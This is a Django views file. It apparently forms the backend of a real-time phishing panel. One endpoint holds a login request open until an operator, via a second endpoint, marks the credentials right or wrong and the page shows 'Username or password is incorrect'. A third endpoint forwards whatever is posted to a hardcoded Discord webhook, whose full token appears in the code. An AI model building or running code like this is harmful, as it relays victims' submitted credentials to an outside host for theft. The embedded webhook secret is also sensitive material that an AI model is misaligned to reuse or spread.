import json

from django.shortcuts import render
from django.http import JsonResponse
import time
from rest_framework.response import Response
from discord_webhook import DiscordWebhook
from rest_framework.decorators import api_view

requestIsSent = False
finalResult = None
finalResultInString = None


@api_view(['POST'])
def activate(request):
    try:
        start_time = time.time()
        timeout_duration = 600  # 5
        global finalResult
        global requestIsSent
        global finalResultInString

        if requestIsSent is True:
            pass
        else:
            requestIsSent = True

        while finalResult is None:

            if finalResult is not None:
                break

            elapsed_time = time.time() - start_time
            print(elapsed_time)
            if elapsed_time >= timeout_duration:
                break

        requestIsSent = False

        return JsonResponse(finalResultInString, safe=False)
    except Exception as e:
        print(e)
        return JsonResponse(
            {'error': 'error'}
        )


def change_status(request):
    global requestIsSent
    global finalResult
    if requestIsSent is False:
        return JsonResponse("session is not started", safe=False)
    else:
        global finalResult
        global finalResultInString
        print(request.GET.get('value'))

        if request.GET.get('value') == 'False':
            print("lol1")
            finalResultInString = "Username or password is incorrect. Try again"
            finalResult = request.GET.get('value')
            time.sleep(1.5)
            finalResult = None
            return JsonResponse('success', safe=False)

        else:
            print("lol2")
            finalResult = request.GET.get('value')
            finalResultInString = True
            time.sleep(1.5)
            finalResult = None
            return JsonResponse(True, safe=False)


@api_view(['POST'])
def call_discord(request):
    msg = json.loads(request.body)
    try:
        webhook = DiscordWebhook(
            url="https://discord.com/api/webhooks/1185232625347068044/Y6oa1L1vreJa3dYSLXa5ZtdRqPdayzUivLx25vCZAoxU6a-mdADZkX-6JRAMvGdlJpNI",
            content= msg)
        webhook.execute()
        return Response(True)
    except Exception as e:
        webhook = DiscordWebhook(
            url="https://discord.com/api/webhooks/1185232625347068044/Y6oa1L1vreJa3dYSLXa5ZtdRqPdayzUivLx25vCZAoxU6a-mdADZkX-6JRAMvGdlJpNI",
            content="შეცდომა")
        webhook.execute()
        return Response(False)
